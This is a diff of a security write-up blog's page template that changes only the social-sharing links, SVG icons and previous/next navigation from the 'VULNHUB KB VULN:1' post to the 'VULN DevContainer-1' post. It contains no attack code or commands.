-<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvulnhub-kb-vuln1-makinas%25C4%25B1-write-up%2f&amp;media=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvulnhub-kb-vuln1-makinas%25C4%25B1-write-up%2f;description=VULNHUB%20KB%20VULN%3a1%20Makinas%c4%b1%20Write%20Up" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvuln-devcontainer-1-write-up%2f&amp;media=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvuln-devcontainer-1-write-up%2f;description=VULN%20DevContainer-1%20Write%20Up" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
   <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
     </div>
@@ -428,7 +382,7 @@ Root dizinine gidilir ve flag.txt dosyası okunarak makina çözümlemesi tamaml
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvulnhub-kb-vuln1-makinas%25C4%25B1-write-up%2f&amp;title=VULNHUB%20KB%20VULN%3a1%20Makinas%c4%b1%20Write%20Up&amp;summary=VULNHUB%20KB%20VULN%3a1%20Makinas%c4%b1%20Write%20Up&amp;source=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvulnhub-kb-vuln1-makinas%25C4%25B1-write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvuln-devcontainer-1-write-up%2f&amp;title=VULN%20DevContainer-1%20Write%20Up&amp;summary=VULN%20DevContainer-1%20Write%20Up&amp;source=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvuln-devcontainer-1-write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
   <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
     </div>
@@ -436,7 +390,7 @@ Root dizinine gidilir ve flag.txt dosyası okunarak makina çözümlemesi tamaml
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvulnhub-kb-vuln1-makinas%25C4%25B1-write-up%2f&amp;resubmit=true&amp;title=VULNHUB%20KB%20VULN%3a1%20Makinas%c4%b1%20Write%20Up" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvuln-devcontainer-1-write-up%2f&amp;resubmit=true&amp;title=VULN%20DevContainer-1%20Write%20Up" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
   <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
     </div>
@@ -444,7 +398,7 @@ Root dizinine gidilir ve flag.txt dosyası okunarak makina çözümlemesi tamaml
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvulnhub-kb-vuln1-makinas%25C4%25B1-write-up%2f;title=VULNHUB%20KB%20VULN%3a1%20Makinas%c4%b1%20Write%20Up" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvuln-devcontainer-1-write-up%2f;title=VULN%20DevContainer-1%20Write%20Up" target="_blank" rel="noopener" aria-label="" title="Share on xing">
   <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
     </div>
@@ -452,7 +406,7 @@ Root dizinine gidilir ve flag.txt dosyası okunarak makina çözümlemesi tamaml
 </a>
 
 
-<a class="resp-sharing-button__link" href="whatsapp://send?text=VULNHUB%20KB%20VULN%3a1%20Makinas%c4%b1%20Write%20Up%20https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvulnhub-kb-vuln1-makinas%25C4%25B1-write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+<a class="resp-sharing-button__link" href="whatsapp://send?text=VULN%20DevContainer-1%20Write%20Up%20https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvuln-devcontainer-1-write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
   <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
     </div>
@@ -460,7 +414,7 @@ Root dizinine gidilir ve flag.txt dosyası okunarak makina çözümlemesi tamaml
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvulnhub-kb-vuln1-makinas%25C4%25B1-write-up%2f&amp;t=VULNHUB%20KB%20VULN%3a1%20Makinas%c4%b1%20Write%20Up" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvuln-devcontainer-1-write-up%2f&amp;t=VULN%20DevContainer-1%20Write%20Up" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
   <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
 			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
     </div>
@@ -468,7 +422,7 @@ Root dizinine gidilir ve flag.txt dosyası okunarak makina çözümlemesi tamaml
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=VULNHUB%20KB%20VULN%3a1%20Makinas%c4%b1%20Write%20Up&amp;url=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvulnhub-kb-vuln1-makinas%25C4%25B1-write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=VULN%20DevContainer-1%20Write%20Up&amp;url=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvuln-devcontainer-1-write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
   <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
       <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
     </div>
@@ -486,18 +440,11 @@ Root dizinine gidilir ve flag.txt dosyası okunarak makina çözümlemesi tamaml
 
         <div class="pagination__buttons">
           
-            <span class="button previous">
-              <a href="https://barcode91.github.io/posts/2020/09/vuln-devcontainer-1-write-up/">
-                <span class="button__icon">←</span>
-                <span class="button__text">VULN DevContainer-1 Write Up</span>
-              </a>
-            </span>
-          
 
           
             <span class="button next">
-              <a href="https://barcode91.github.io/posts/2020/09/thm-cmess-write-up/">
-                <span class="button__text">THM CMess Write Up</span>
+              <a href="https://barcode91.github.io/posts/2020/09/vulnhub-kb-vuln1-makinas%C4%B1-write-up/">
+                <span class="button__text">VULNHUB KB VULN:1 Makinası Write Up</span>
                 <span class="button__icon">→</span>
               </a>
             </span>
